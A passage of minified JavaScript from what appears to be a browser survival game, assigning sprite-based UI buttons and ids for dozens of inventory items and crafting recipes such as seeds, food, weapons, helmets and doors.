                    this.inv_buttons[Be.SHOVEL_AMETHYST].id = Be.SHOVEL_AMETHYST,
                    this.inv_buttons[Be.SPANNER] = be(60, 60, 0, sprite[ze.INV_SPANNER], 3),
                    this.inv_buttons[Be.SPANNER].id = Be.SPANNER,
                    this.inv_buttons[Be.KRAKEN_SKIN] = be(60, 60, 0, sprite[ze.INV_KRAKEN_SKIN], 3),
                    this.inv_buttons[Be.KRAKEN_SKIN].id = Be.KRAKEN_SKIN,
                    this.inv_buttons[Be.KRAKEN_SKIN].info.img[2] = this.inv_buttons[Be.KRAKEN_SKIN].info.img[0],
                    this.inv_buttons[Be.WATERING_CAN] = be(60, 60, 0, sprite[ze.INV_WATERING_CAN], 3),
                    this.inv_buttons[Be.WATERING_CAN].id = Be.WATERING_CAN,
                    this.inv_buttons[Be.FLOUR] = be(60, 60, 0, sprite[ze.INV_FLOUR], 3),
                    this.inv_buttons[Be.FLOUR].id = Be.FLOUR,
                    this.inv_buttons[Be.FLOUR].info.img[2] = this.inv_buttons[Be.FLOUR].info.img[0],
                    this.inv_buttons[Be.WHEAT_SEED] = be(60, 60, 0, sprite[ze.INV_WHEAT_SEED], 3),
                    this.inv_buttons[Be.WHEAT_SEED].id = Be.WHEAT_SEED,
                    this.inv_buttons[Be.COOKIE] = be(60, 60, 0, sprite[ze.INV_COOKIE], 3),
                    this.inv_buttons[Be.COOKIE].id = Be.COOKIE,
                    this.inv_buttons[Be.WILD_WHEAT] = be(60, 60, 0, sprite[ze.INV_WILD_WHEAT], 3),
                    this.inv_buttons[Be.WILD_WHEAT].id = Be.WILD_WHEAT,
                    this.inv_buttons[Be.WILD_WHEAT].info.img[2] = this.inv_buttons[Be.WILD_WHEAT].info.img[0],
                    this.inv_buttons[Be.WINDMILL] = be(60, 60, 0, sprite[ze.INV_WINDMILL], 3),
                    this.inv_buttons[Be.WINDMILL].id = Be.WINDMILL,
                    this.inv_buttons[Be.SUPER_DIVING_SUIT] = be(60, 60, 0, sprite[ze.INV_SUPER_DIVING_SUIT], 3),
                    this.inv_buttons[Be.SUPER_DIVING_SUIT].id = Be.SUPER_DIVING_SUIT,
                    this.inv_buttons[Be.DIVING_MASK] = be(60, 60, 0, sprite[ze.INV_DIVING_MASK], 3),
                    this.inv_buttons[Be.DIVING_MASK].id = Be.DIVING_MASK,
                    this.inv_buttons[Be.WATERING_CAN_FULL] = be(60, 60, 0, sprite[ze.INV_WATERING_CAN_FULL], 3),
                    this.inv_buttons[Be.WATERING_CAN_FULL].id = Be.WATERING_CAN_FULL,
                    this.inv_buttons[Be.CAKE] = be(60, 60, 0, sprite[ze.INV_CAKE], 3),
                    this.inv_buttons[Be.CAKE].id = Be.CAKE,
                    this.inv_buttons[Be.BREAD] = be(60, 60, 0, sprite[ze.INV_BREAD], 3),
                    this.inv_buttons[Be.BREAD].id = Be.BREAD,
                    this.inv_buttons[Be.FOODFISH] = be(60, 60, 0, sprite[ze.INV_FOODFISH], 3),
                    this.inv_buttons[Be.FOODFISH].id = Be.FOODFISH,
                    this.inv_buttons[Be.FOODFISH_COOKED] = be(60, 60, 0, sprite[ze.INV_FOODFISH_COOKED], 3),
                    this.inv_buttons[Be.FOODFISH_COOKED].id = Be.FOODFISH_COOKED,
                    this.inv_buttons[Be.SCALES] = be(60, 60, 0, sprite[ze.INV_SCALES], 3),
                    this.inv_buttons[Be.SCALES].id = Be.SCALES,
                    this.inv_buttons[Be.SCALES].info.img[2] = this.inv_buttons[Be.SCALES].info.img[0],
                    this.inv_buttons[Be.GROUND] = be(60, 60, 0, sprite[ze.INV_GROUND], 3),
                    this.inv_buttons[Be.GROUND].id = Be.GROUND,
                    this.inv_buttons[Be.GROUND].info.img[2] = this.inv_buttons[Be.GROUND].info.img[0],
                    this.inv_buttons[Be.PLOT] = be(60, 60, 0, sprite[ze.INV_PLOT], 3),
                    this.inv_buttons[Be.PLOT].id = Be.PLOT,
                    this.inv_buttons[Be.ICE] = be(60, 60, 0, sprite[ze.INV_ICE], 3),
                    this.inv_buttons[Be.ICE].id = Be.ICE,
                    this.inv_buttons[Be.ICE].info.img[2] = this.inv_buttons[Be.ICE].info.img[0],
                    this.inv_buttons[Be.BREAD_OVEN] = be(60, 60, 0, sprite[ze.INV_BREAD_OVEN], 3),
                    this.inv_buttons[Be.BREAD_OVEN].id = Be.BREAD_OVEN,
                    this.inv_buttons[Be.SANDWICH] = be(60, 60, 0, sprite[ze.INV_SANDWICH], 3),
                    this.inv_buttons[Be.SANDWICH].id = Be.SANDWICH,
                    this.inv_buttons[Be.DRAGON_HELMET] = be(60, 60, 0, sprite[ze.INV_DRAGON_HELMET], 3),
                    this.inv_buttons[Be.DRAGON_HELMET].id = Be.DRAGON_HELMET,
                    this.inv_buttons[Be.DRAGON_SWORD] = be(60, 60, 0, sprite[ze.INV_DRAGON_SWORD], 3),
                    this.inv_buttons[Be.DRAGON_SWORD].id = Be.DRAGON_SWORD,
                    this.inv_buttons[Be.DRAGON_ORB] = be(60, 60, 0, sprite[ze.INV_DRAGON_ORB], 3),
                    this.inv_buttons[Be.DRAGON_ORB].id = Be.DRAGON_ORB,
                    this.inv_buttons[Be.DRAGON_ORB].info.img[2] = this.inv_buttons[Be.DRAGON_ORB].info.img[0],
                    this.inv_buttons[Be.DRAGON_CUBE] = be(60, 60, 0, sprite[ze.INV_DRAGON_CUBE], 3),
                    this.inv_buttons[Be.DRAGON_CUBE].id = Be.DRAGON_CUBE,
                    this.inv_buttons[Be.DRAGON_CUBE].info.img[2] = this.inv_buttons[Be.DRAGON_CUBE].info.img[0],
                    this.inv_buttons[Be.LAVA_SPEAR] = be(60, 60, 0, sprite[ze.INV_LAVA_SPEAR], 3),
                    this.inv_buttons[Be.LAVA_SPEAR].id = Be.LAVA_SPEAR,
                    this.inv_buttons[Be.LAVA_SWORD] = be(60, 60, 0, sprite[ze.INV_LAVA_SWORD], 3),
                    this.inv_buttons[Be.LAVA_SWORD].id = Be.LAVA_SWORD,
                    this.inv_buttons[Be.LAVA_ORB] = be(60, 60, 0, sprite[ze.INV_LAVA_ORB], 3),
                    this.inv_buttons[Be.LAVA_ORB].id = Be.LAVA_ORB,
                    this.inv_buttons[Be.LAVA_ORB].info.img[2] = this.inv_buttons[Be.LAVA_ORB].info.img[0],
                    this.inv_buttons[Be.LAVA_CUBE] = be(60, 60, 0, sprite[ze.INV_LAVA_CUBE], 3),
                    this.inv_buttons[Be.LAVA_CUBE].id = Be.LAVA_CUBE,
                    this.inv_buttons[Be.LAVA_CUBE].info.img[2] = this.inv_buttons[Be.LAVA_CUBE].info.img[0],
                    this.inv_buttons[Be.CROWN_GREEN] = be(60, 60, 0, sprite[ze.INV_CROWN_GREEN], 3),
                    this.inv_buttons[Be.CROWN_GREEN].id = Be.CROWN_GREEN,
                    this.inv_buttons[Be.GEMME_GREEN] = be(60, 60, 0, sprite[ze.INV_GEMME_GREEN], 3),
                    this.inv_buttons[Be.GEMME_GREEN].id = Be.GEMME_GREEN,
                    this.inv_buttons[Be.GEMME_GREEN].info.img[2] = this.inv_buttons[Be.GEMME_GREEN].info.img[0],
                    this.inv_buttons[Be.GEMME_ORANGE] = be(60, 60, 0, sprite[ze.INV_GEMME_ORANGE], 3),
                    this.inv_buttons[Be.GEMME_ORANGE].id = Be.GEMME_ORANGE,
                    this.inv_buttons[Be.GEMME_ORANGE].info.img[2] = this.inv_buttons[Be.GEMME_ORANGE].info.img[0],
                    this.inv_buttons[Be.CROWN_ORANGE] = be(60, 60, 0, sprite[ze.INV_CROWN_ORANGE], 3),
                    this.inv_buttons[Be.CROWN_ORANGE].id = Be.CROWN_ORANGE,
                    this.inv_buttons[Be.GEMME_BLUE] = be(60, 60, 0, sprite[ze.INV_GEMME_BLUE], 3),
                    this.inv_buttons[Be.GEMME_BLUE].id = Be.GEMME_BLUE,
                    this.inv_buttons[Be.GEMME_BLUE].info.img[2] = this.inv_buttons[Be.GEMME_BLUE].info.img[0],
                    this.inv_buttons[Be.CROWN_BLUE] = be(60, 60, 0, sprite[ze.INV_CROWN_BLUE], 3),
                    this.inv_buttons[Be.CROWN_BLUE].id = Be.CROWN_BLUE,
                    this.inv_buttons[Be.HOOD] = be(60, 60, 0, sprite[ze.INV_HOOD], 3),
                    this.inv_buttons[Be.HOOD].id = Be.HOOD,
                    this.inv_buttons[Be.PEASANT] = be(60, 60, 0, sprite[ze.INV_PEASANT], 3),
                    this.inv_buttons[Be.PEASANT].id = Be.PEASANT,
                    this.inv_buttons[Be.SPECIAL_FUR] = be(60, 60, 0, sprite[ze.INV_SPECIAL_FUR], 3),
                    this.inv_buttons[Be.SPECIAL_FUR].id = Be.SPECIAL_FUR,
                    this.inv_buttons[Be.SPECIAL_FUR_2] = be(60, 60, 0, sprite[ze.INV_SPECIAL_FUR_2], 3),
                    this.inv_buttons[Be.SPECIAL_FUR_2].id = Be.SPECIAL_FUR_2,
                    this.inv_buttons[Be.WINTER_PEASANT] = be(60, 60, 0, sprite[ze.INV_WINTER_PEASANT], 3),
                    this.inv_buttons[Be.WINTER_PEASANT].id = Be.WINTER_PEASANT,
                    this.inv_buttons[Be.WINTER_HOOD] = be(60, 60, 0, sprite[ze.INV_WINTER_HOOD], 3),
                    this.inv_buttons[Be.WINTER_HOOD].id = Be.WINTER_HOOD,
                    this.inv_buttons[Be.BUCKET_FULL] = be(60, 60, 0, sprite[ze.INV_BUCKET_FULL], 3),
                    this.inv_buttons[Be.BUCKET_FULL].id = Be.BUCKET_FULL,
                    this.inv_buttons[Be.BUCKET_EMPTY] = be(60, 60, 0, sprite[ze.INV_BUCKET_EMPTY], 3),
                    this.inv_buttons[Be.BUCKET_EMPTY].id = Be.BUCKET_EMPTY,
                    this.inv_buttons[Be.WELL] = be(60, 60, 0, sprite[ze.INV_WELL], 3),
                    this.inv_buttons[Be.WELL].id = Be.WELL,
                    this.inv_buttons[Be.SIGN] = be(60, 60, 0, sprite[ze.INV_SIGN], 3),
                    this.inv_buttons[Be.SIGN].id = Be.SIGN,
                    this.inv_buttons[Be.PUMPKIN_SEED] = be(60, 60, 0, sprite[ze.INV_PUMPKIN_SEED], 3),
                    this.inv_buttons[Be.PUMPKIN_SEED].id = Be.PUMPKIN_SEED,
                    this.inv_buttons[Be.PUMPKIN] = be(60, 60, 0, sprite[ze.INV_PUMPKIN], 3),
                    this.inv_buttons[Be.PUMPKIN].id = Be.PUMPKIN,
                    this.inv_buttons[Be.GARLIC_SEED] = be(60, 60, 0, sprite[ze.INV_GARLIC_SEED], 3),
                    this.inv_buttons[Be.GARLIC_SEED].id = Be.GARLIC_SEED,
                    this.inv_buttons[Be.GARLIC] = be(60, 60, 0, sprite[ze.INV_GARLIC], 3),
                    this.inv_buttons[Be.GARLIC].id = Be.GARLIC,
                    this.inv_buttons[Be.ROOF] = be(60, 60, 0, sprite[ze.INV_ROOF], 3),
                    this.inv_buttons[Be.ROOF].id = Be.ROOF,
                    this.inv_buttons[Be.THORNBUSH_SEED] = be(60, 60, 0, sprite[ze.INV_THORNBUSH_SEED], 3),
                    this.inv_buttons[Be.THORNBUSH_SEED].id = Be.THORNBUSH_SEED,
                    this.inv_buttons[Be.THORNBUSH] = be(60, 60, 0, sprite[ze.INV_THORNBUSH], 3),
                    this.inv_buttons[Be.THORNBUSH].id = Be.THORNBUSH,
                    this.inv_buttons[Be.CARROT_SEED] = be(60, 60, 0, sprite[ze.INV_CARROT_SEED], 3),
                    this.inv_buttons[Be.CARROT_SEED].id = Be.CARROT_SEED,
                    this.inv_buttons[Be.CARROT] = be(60, 60, 0, sprite[ze.INV_CARROT], 3),
                    this.inv_buttons[Be.CARROT].id = Be.CARROT,
                    this.inv_buttons[Be.TOMATO_SEED] = be(60, 60, 0, sprite[ze.INV_TOMATO_SEED], 3),
                    this.inv_buttons[Be.TOMATO_SEED].id = Be.TOMATO_SEED,
                    this.inv_buttons[Be.TOMATO] = be(60, 60, 0, sprite[ze.INV_TOMATO], 3),
                    this.inv_buttons[Be.TOMATO].id = Be.TOMATO,
                    this.inv_buttons[Be.WATERMELON_SEED] = be(60, 60, 0, sprite[ze.INV_WATERMELON_SEED], 3),
                    this.inv_buttons[Be.WATERMELON_SEED].id = Be.WATERMELON_SEED,
                    this.inv_buttons[Be.WATERMELON] = be(60, 60, 0, sprite[ze.INV_WATERMELON], 3),
                    this.inv_buttons[Be.WATERMELON].id = Be.WATERMELON,
                    this.inv_buttons[Be.ALOE_VERA_SEED] = be(60, 60, 0, sprite[ze.INV_ALOE_VERA_SEED], 3),
                    this.inv_buttons[Be.ALOE_VERA_SEED].id = Be.ALOE_VERA_SEED,
                    this.inv_buttons[Be.ALOE_VERA] = be(60, 60, 0, sprite[ze.INV_ALOE_VERA], 3),
                    this.inv_buttons[Be.ALOE_VERA].id = Be.ALOE_VERA,
                    this.inv_buttons[Be.CHRISTMAS_HAT] = be(60, 60, 0, sprite[ze.INV_CHRISTMAS_HAT], 3),
                    this.inv_buttons[Be.CHRISTMAS_HAT].id = Be.CHRISTMAS_HAT,
                    this.inv_buttons[Be.ELF_HAT] = be(60, 60, 0, sprite[ze.INV_ELF_HAT], 3),
                    this.inv_buttons[Be.ELF_HAT].id = Be.ELF_HAT,
                    this.inv_buttons[Be.WOOD_SPEAR] = be(60, 60, 0, sprite[ze.INV_WOOD_SPEAR], 3),
                    this.inv_buttons[Be.WOOD_SPEAR].id = Be.WOOD_SPEAR,
                    this.inv_buttons[Be.DRAGON_SPEAR] = be(60, 60, 0, sprite[ze.INV_DRAGON_SPEAR], 3),
                    this.inv_buttons[Be.DRAGON_SPEAR].id = Be.DRAGON_SPEAR,
                    this.inv_buttons[Be.CRAB_STICK] = be(60, 60, 0, sprite[ze.INV_CRAB_STICK], 3),
                    this.inv_buttons[Be.CRAB_STICK].id = Be.CRAB_STICK,
                    this.inv_buttons[Be.CRAB_SPEAR] = be(60, 60, 0, sprite[ze.INV_CRAB_SPEAR], 3),
                    this.inv_buttons[Be.CRAB_SPEAR].id = Be.CRAB_SPEAR,
                    this.inv_buttons[Be.CRAB_LOOT] = be(60, 60, 0, sprite[ze.INV_CRAB_LOOT], 3),
                    this.inv_buttons[Be.CRAB_LOOT].id = Be.CRAB_LOOT,
                    this.inv_buttons[Be.BED] = be(60, 60, 0, sprite[ze.INV_BED], 3),
                    this.inv_buttons[Be.BED].id = Be.BED,
                    this.inv_buttons[Be.CROWN_CRAB] = be(60, 60, 0, sprite[ze.INV_CROWN_CRAB], 3),
                    this.inv_buttons[Be.CROWN_CRAB].id = Be.CROWN_CRAB,
                    this.inv_buttons[Be.GARLAND] = be(60, 60, 0, sprite[ze.INV_GARLAND], 3),
                    this.inv_buttons[Be.GARLAND].id = Be.GARLAND,
                    this.inv_buttons[Be.CANDY] = be(60, 60, 0, sprite[ze.INV_CANDY], 3),
                    this.inv_buttons[Be.CANDY].id = Be.CANDY,
                    this.inv_buttons[Be.SUGAR_CAN] = be(60, 60, 0, sprite[ze.INV_SUGAR_CAN], 3),
                    this.inv_buttons[Be.SUGAR_CAN].id = Be.SUGAR_CAN,
                    this.craft_buttons = [],
                    this.craft_buttons[u.SWORD] = be(60, 60, 0, sprite[ze.CRAFT_SWORD], 3),
                    this.craft_buttons[u.SWORD].id = u.SWORD,
                    this.craft_buttons[u.PICK] = be(60, 60, 0, sprite[ze.CRAFT_PICK], 3),
                    this.craft_buttons[u.PICK].id = u.PICK,
                    this.craft_buttons[u.FIRE] = be(60, 60, 0, sprite[ze.CRAFT_FIRE], 3),
                    this.craft_buttons[u.FIRE].id = u.FIRE,
                    this.craft_buttons[u.WORKBENCH] = be(60, 60, 0, sprite[ze.CRAFT_WORK], 3),
                    this.craft_buttons[u.WORKBENCH].id = u.WORKBENCH,
                    this.craft_buttons[u.WALL] = be(60, 60, 0, sprite[ze.CRAFT_WALL], 3),
                    this.craft_buttons[u.WALL].id = u.WALL,
                    this.craft_buttons[u.SPIKE] = be(60, 60, 0, sprite[ze.CRAFT_SPIKE], 3),
                    this.craft_buttons[u.SPIKE].id = u.SPIKE,
                    this.craft_buttons[u.SEED] = be(60, 60, 0, sprite[ze.CRAFT_SEED], 3),
                    this.craft_buttons[u.SEED].id = u.SEED,
                    this.craft_buttons[u.PICK_GOLD] = be(60, 60, 0, sprite[ze.CRAFT_PICK_GOLD], 3),
                    this.craft_buttons[u.PICK_GOLD].id = u.PICK_GOLD,
                    this.craft_buttons[u.PICK_DIAMOND] = be(60, 60, 0, sprite[ze.CRAFT_PICK_DIAMOND], 3),
                    this.craft_buttons[u.PICK_DIAMOND].id = u.PICK_DIAMOND,
                    this.craft_buttons[u.SWORD_GOLD] = be(60, 60, 0, sprite[ze.CRAFT_SWORD_GOLD], 3),
                    this.craft_buttons[u.SWORD_GOLD].id = u.SWORD_GOLD,
                    this.craft_buttons[u.SWORD_WOOD] = be(60, 60, 0, sprite[ze.CRAFT_SWORD_WOOD], 3),
                    this.craft_buttons[u.SWORD_WOOD].id = u.SWORD_WOOD,
                    this.craft_buttons[u.SWORD_DIAMOND] = be(60, 60, 0, sprite[ze.CRAFT_SWORD_DIAMOND], 3),
                    this.craft_buttons[u.SWORD_DIAMOND].id = u.SWORD_DIAMOND,
                    this.craft_buttons[u.PICK_WOOD] = be(60, 60, 0, sprite[ze.CRAFT_PICK_WOOD], 3),
                    this.craft_buttons[u.PICK_WOOD].id = u.PICK_WOOD,
                    this.craft_buttons[u.COOKED_MEAT] = be(60, 60, 0, sprite[ze.CRAFT_COOKED_MEAT], 3),
                    this.craft_buttons[u.COOKED_MEAT].id = u.COOKED_MEAT,
                    this.craft_buttons[u.BIG_FIRE] = be(60, 60, 0, sprite[ze.CRAFT_BIG_FIRE], 3),
                    this.craft_buttons[u.BIG_FIRE].id = u.BIG_FIRE,
                    this.craft_buttons[u.BANDAGE] = be(60, 60, 0, sprite[ze.CRAFT_BANDAGE], 3),
                    this.craft_buttons[u.BANDAGE].id = u.BANDAGE,
                    this.craft_buttons[u.STONE_WALL] = be(60, 60, 0, sprite[ze.CRAFT_STONE_WALL], 3),
                    this.craft_buttons[u.STONE_WALL].id = u.STONE_WALL,
                    this.craft_buttons[u.GOLD_WALL] = be(60, 60, 0, sprite[ze.CRAFT_GOLD_WALL], 3),
                    this.craft_buttons[u.GOLD_WALL].id = u.GOLD_WALL,
                    this.craft_buttons[u.DIAMOND_WALL] = be(60, 60, 0, sprite[ze.CRAFT_DIAMOND_WALL], 3),
                    this.craft_buttons[u.DIAMOND_WALL].id = u.DIAMOND_WALL,
                    this.craft_buttons[u.WOOD_DOOR] = be(60, 60, 0, sprite[ze.CRAFT_DOOR_WOOD_CLOSE], 3),
                    this.craft_buttons[u.WOOD_DOOR].id = u.WOOD_DOOR,
                    this.craft_buttons[u.CHEST] = be(60, 60, 0, sprite[ze.CRAFT_CHEST], 3),
                    this.craft_buttons[u.CHEST].id = u.CHEST,
                    this.craft_buttons[u.STONE_SPIKE] = be(60, 60, 0, sprite[ze.CRAFT_STONE_SPIKE], 3),
                    this.craft_buttons[u.STONE_SPIKE].id = u.STONE_SPIKE,
                    this.craft_buttons[u.GOLD_SPIKE] = be(60, 60, 0, sprite[ze.CRAFT_GOLD_SPIKE], 3),
                    this.craft_buttons[u.GOLD_SPIKE].id = u.GOLD_SPIKE,
                    this.craft_buttons[u.DIAMOND_SPIKE] = be(60, 60, 0, sprite[ze.CRAFT_DIAMOND_SPIKE], 3),
                    this.craft_buttons[u.DIAMOND_SPIKE].id = u.DIAMOND_SPIKE,
                    this.craft_buttons[u.BAG] = be(60, 60, 0, sprite[ze.CRAFT_BAG], 3),
                    this.craft_buttons[u.BAG].id = u.BAG,
                    this.craft_buttons[u.EARMUFFS] = be(60, 60, 0, sprite[ze.CRAFT_EARMUFFS], 3),
                    this.craft_buttons[u.EARMUFFS].id = u.EARMUFFS,
                    this.craft_buttons[u.STONE_DOOR] = be(60, 60, 0, sprite[ze.CRAFT_DOOR_STONE_CLOSE], 3),
                    this.craft_buttons[u.STONE_DOOR].id = u.STONE_DOOR,
                    this.craft_buttons[u.GOLD_DOOR] = be(60, 60, 0, sprite[ze.CRAFT_DOOR_GOLD_CLOSE], 3),
                    this.craft_buttons[u.GOLD_DOOR].id = u.GOLD_DOOR,
                    this.craft_buttons[u.DIAMOND_DOOR] = be(60, 60, 0, sprite[ze.CRAFT_DOOR_DIAMOND_CLOSE], 3),
                    this.craft_buttons[u.DIAMOND_DOOR].id = u.DIAMOND_DOOR,
                    this.craft_buttons[u.EARMUFFS] = be(60, 60, 0, sprite[ze.CRAFT_EARMUFFS], 3),
                    this.craft_buttons[u.EARMUFFS].id = u.EARMUFFS,
                    this.craft_buttons[u.COAT] = be(60, 60, 0, sprite[ze.CRAFT_COAT], 3),
                    this.craft_buttons[u.COAT].id = u.COAT,
                    this.craft_buttons[u.WOOD_SPEAR] = be(60, 60, 0, sprite[ze.CRAFT_WOOD_SPEAR], 3),
                    this.craft_buttons[u.WOOD_SPEAR].id = u.WOOD_SPEAR,
                    this.craft_buttons[u.SPEAR] = be(60, 60, 0, sprite[ze.CRAFT_SPEAR], 3),
                    this.craft_buttons[u.SPEAR].id = u.SPEAR,
                    this.craft_buttons[u.GOLD_SPEAR] = be(60, 60, 0, sprite[ze.CRAFT_GOLD_SPEAR], 3),
                    this.craft_buttons[u.GOLD_SPEAR].id = u.GOLD_SPEAR,
                    this.craft_buttons[u.DIAMOND_SPEAR] = be(60, 60, 0, sprite[ze.CRAFT_DIAMOND_SPEAR], 3),
                    this.craft_buttons[u.DIAMOND_SPEAR].id = u.DIAMOND_SPEAR,
                    this.craft_buttons[u.DRAGON_SPEAR] = be(60, 60, 0, sprite[ze.CRAFT_DRAGON_SPEAR], 3),
                    this.craft_buttons[u.DRAGON_SPEAR].id = u.DRAGON_SPEAR,
                    this.craft_buttons[u.FURNACE] = be(60, 60, 0, sprite[ze.CRAFT_FURNACE], 3),
                    this.craft_buttons[u.FURNACE].id = u.FURNACE,
                    this.craft_buttons[u.EXPLORER_HAT] = be(60, 60, 0, sprite[ze.CRAFT_EXPLORER_HAT], 3),
                    this.craft_buttons[u.EXPLORER_HAT].id = u.EXPLORER_HAT,
                    this.craft_buttons[u.PIRATE_HAT] = be(60, 60, 0, sprite[ze.CRAFT_PIRATE_HAT], 3),
                    this.craft_buttons[u.PIRATE_HAT].id = u.PIRATE_HAT,
                    this.craft_buttons[u.FLOWER_HAT] = be(60, 60, 0, sprite[ze.CRAFT_FLOWER_HAT], 3),
                    this.craft_buttons[u.FLOWER_HAT].id = u.FLOWER_HAT,
                    this.craft_buttons[u.FUR_HAT] = be(60, 60, 0, sprite[ze.CRAFT_FUR_HAT], 3),
                    this.craft_buttons[u.FUR_HAT].id = u.FUR_HAT,
                    this.craft_buttons[u.TURBAN1] = be(60, 60, 0, sprite[ze.CRAFT_TURBAN1], 3),
                    this.craft_buttons[u.TURBAN1].id = u.TURBAN1,
                    this.craft_buttons[u.TURBAN2] = be(60, 60, 0, sprite[ze.CRAFT_TURBAN2], 3),
                    this.craft_buttons[u.TURBAN2].id = u.TURBAN2,
                    this.craft_buttons[u.WOOD_BOW] = be(60, 60, 0, sprite[ze.CRAFT_WOOD_BOW], 3),
                    this.craft_buttons[u.WOOD_BOW].id = u.WOOD_BOW,
                    this.craft_buttons[u.WOOD_ARROW] = be(60, 60, 0, sprite[ze.CRAFT_WOOD_ARROW], 3),
                    this.craft_buttons[u.WOOD_ARROW].id = u.WOOD_ARROW,
                    this.craft_buttons[u.WOOD_SHIELD] = be(60, 60, 0, sprite[ze.CRAFT_WOOD_SHIELD], 3),
                    this.craft_buttons[u.WOOD_SHIELD].id = u.WOOD_SHIELD,
                    this.craft_buttons[u.STONE_BOW] = be(60, 60, 0, sprite[ze.CRAFT_STONE_BOW], 3),
                    this.craft_buttons[u.STONE_BOW].id = u.STONE_BOW,
                    this.craft_buttons[u.STONE_ARROW] = be(60, 60, 0, sprite[ze.CRAFT_STONE_ARROW], 3),
                    this.craft_buttons[u.STONE_ARROW].id = u.STONE_ARROW,
                    this.craft_buttons[u.STONE_SHIELD] = be(60, 60, 0, sprite[ze.CRAFT_STONE_SHIELD], 3),
                    this.craft_buttons[u.STONE_SHIELD].id = u.STONE_SHIELD,
                    this.craft_buttons[u.GOLD_BOW] = be(60, 60, 0, sprite[ze.CRAFT_GOLD_BOW], 3),
                    this.craft_buttons[u.GOLD_BOW].id = u.GOLD_BOW,
                    this.craft_buttons[u.GOLD_ARROW] = be(60, 60, 0, sprite[ze.CRAFT_GOLD_ARROW], 3),
                    this.craft_buttons[u.GOLD_ARROW].id = u.GOLD_ARROW,
                    this.craft_buttons[u.GOLD_SHIELD] = be(60, 60, 0, sprite[ze.CRAFT_GOLD_SHIELD], 3),
                    this.craft_buttons[u.GOLD_SHIELD].id = u.GOLD_SHIELD,
                    this.craft_buttons[u.DIAMOND_BOW] = be(60, 60, 0, sprite[ze.CRAFT_DIAMOND_BOW], 3),
                    this.craft_buttons[u.DIAMOND_BOW].id = u.DIAMOND_BOW,
                    this.craft_buttons[u.DIAMOND_ARROW] = be(60, 60, 0, sprite[ze.CRAFT_DIAMOND_ARROW], 3),
                    this.craft_buttons[u.DIAMOND_ARROW].id = u.DIAMOND_ARROW,
                    this.craft_buttons[u.DIAMOND_SHIELD] = be(60, 60, 0, sprite[ze.CRAFT_DIAMOND_SHIELD], 3),
                    this.craft_buttons[u.DIAMOND_SHIELD].id = u.DIAMOND_SHIELD,
                    this.craft_buttons[u.AMETHYST_BOW] = be(60, 60, 0, sprite[ze.CRAFT_AMETHYST_BOW], 3),
                    this.craft_buttons[u.AMETHYST_BOW].id = u.AMETHYST_BOW,
                    this.craft_buttons[u.AMETHYST_ARROW] = be(60, 60, 0, sprite[ze.CRAFT_AMETHYST_ARROW], 3),
                    this.craft_buttons[u.AMETHYST_ARROW].id = u.AMETHYST_ARROW,
                    this.craft_buttons[u.AMETHYST_SHIELD] = be(60, 60, 0, sprite[ze.CRAFT_AMETHYST_SHIELD], 3),
                    this.craft_buttons[u.AMETHYST_SHIELD].id = u.AMETHYST_SHIELD,
                    this.craft_buttons[u.REIDITE_BOW] = be(60, 60, 0, sprite[ze.CRAFT_REIDITE_BOW], 3),
                    this.craft_buttons[u.REIDITE_BOW].id = u.REIDITE_BOW,
                    this.craft_buttons[u.REIDITE_ARROW] = be(60, 60, 0, sprite[ze.CRAFT_REIDITE_ARROW], 3),
                    this.craft_buttons[u.REIDITE_ARROW].id = u.REIDITE_ARROW,
                    this.craft_buttons[u.REIDITE_SHIELD] = be(60, 60, 0, sprite[ze.CRAFT_REIDITE_SHIELD], 3),
                    this.craft_buttons[u.REIDITE_SHIELD].id = u.REIDITE_SHIELD,
                    this.craft_buttons[u.DRAGON_BOW] = be(60, 60, 0, sprite[ze.CRAFT_DRAGON_BOW], 3),
                    this.craft_buttons[u.DRAGON_BOW].id = u.DRAGON_BOW,
                    this.craft_buttons[u.DRAGON_ARROW] = be(60, 60, 0, sprite[ze.CRAFT_DRAGON_ARROW], 3),
                    this.craft_buttons[u.DRAGON_ARROW].id = u.DRAGON_ARROW,
                    this.craft_buttons[u.WOOD_HELMET] = be(60, 60, 0, sprite[ze.CRAFT_WOOD_HELMET], 3),
                    this.craft_buttons[u.WOOD_HELMET].id = u.WOOD_HELMET,
                    this.craft_buttons[u.STONE_HELMET] = be(60, 60, 0, sprite[ze.CRAFT_STONE_HELMET], 3),
                    this.craft_buttons[u.STONE_HELMET].id = u.STONE_HELMET,
                    this.craft_buttons[u.GOLD_HELMET] = be(60, 60, 0, sprite[ze.CRAFT_GOLD_HELMET], 3),
                    this.craft_buttons[u.GOLD_HELMET].id = u.GOLD_HELMET,
                    this.craft_buttons[u.DIAMOND_HELMET] = be(60, 60, 0, sprite[ze.CRAFT_DIAMOND_HELMET], 3),
                    this.craft_buttons[u.DIAMOND_HELMET].id = u.DIAMOND_HELMET,
                    this.craft_buttons[u.BOOK] = be(60, 60, 0, sprite[ze.CRAFT_BOOK], 3),
                    this.craft_buttons[u.BOOK].id = u.BOOK,
                    this.craft_buttons[u.PAPER] = be(60, 60, 0, sprite[ze.CRAFT_PAPER], 3),
                    this.craft_buttons[u.PAPER].id = u.PAPER,
                    this.craft_buttons[u.BAG] = be(60, 60, 0, sprite[ze.CRAFT_BAG], 3),
                    this.craft_buttons[u.BAG].id = u.BAG,
                    this.craft_buttons[u.SWORD_AMETHYST] = be(60, 60, 0, sprite[ze.CRAFT_SWORD_AMETHYST], 3),
                    this.craft_buttons[u.SWORD_AMETHYST].id = u.SWORD_AMETHYST,
                    this.craft_buttons[u.PIRATE_SWORD] = be(60, 60, 0, sprite[ze.CRAFT_PIRATE_SWORD], 3),
                    this.craft_buttons[u.PIRATE_SWORD].id = u.PIRATE_SWORD,
                    this.craft_buttons[u.PICK_AMETHYST] = be(60, 60, 0, sprite[ze.CRAFT_PICK_AMETHYST], 3),
                    this.craft_buttons[u.PICK_AMETHYST].id = u.PICK_AMETHYST,
                    this.craft_buttons[u.PICK_REIDITE] = be(60, 60, 0, sprite[ze.CRAFT_PICK_REIDITE], 3),
                    this.craft_buttons[u.PICK_REIDITE].id = u.PICK_REIDITE,
                    this.craft_buttons[u.AMETHYST_SPEAR] = be(60, 60, 0, sprite[ze.CRAFT_AMETHYST_SPEAR], 3),
                    this.craft_buttons[u.AMETHYST_SPEAR].id = u.AMETHYST_SPEAR,
                    this.craft_buttons[u.HAMMER] = be(60, 60, 0, sprite[ze.CRAFT_HAMMER], 3),
                    this.craft_buttons[u.HAMMER].id = u.HAMMER,
                    this.craft_buttons[u.HAMMER_GOLD] = be(60, 60, 0, sprite[ze.CRAFT_HAMMER_GOLD], 3),
